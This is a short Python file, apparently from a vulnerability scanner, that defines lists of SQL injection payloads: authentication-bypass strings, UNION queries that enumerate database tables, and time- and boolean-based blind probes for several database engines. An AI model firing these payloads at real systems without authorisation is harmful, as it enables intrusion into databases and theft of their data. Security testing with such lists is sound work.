class SQLIPayloads:
    ERROR_BASED = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' AND 1=0 UNION SELECT 1,2,3--",
        "' AND SLEEP(5)--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "admin'--",
        "' OR 'x'='x",
        "' AND 'x'='x",
        "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--",
        "' AND 1=0 UNION ALL SELECT table_name, NULL FROM information_schema.tables--"
    ]
    
    TIME_BASED = [
        "' AND SLEEP(5)--",
        "' AND SLEEP(5)#",
        "' AND BENCHMARK(1000000,MD5('a'))--",
        "' AND pg_sleep(5)--",
        "' AND WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--"
    ]
    
    BOOLEAN_BASED = [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "1' AND '1'='1",
        "1' AND '1'='2"
    ]
    
    @classmethod
    def get_all_payloads(cls):
        return list(set(cls.ERROR_BASED + cls.TIME_BASED + cls.BOOLEAN_BASED))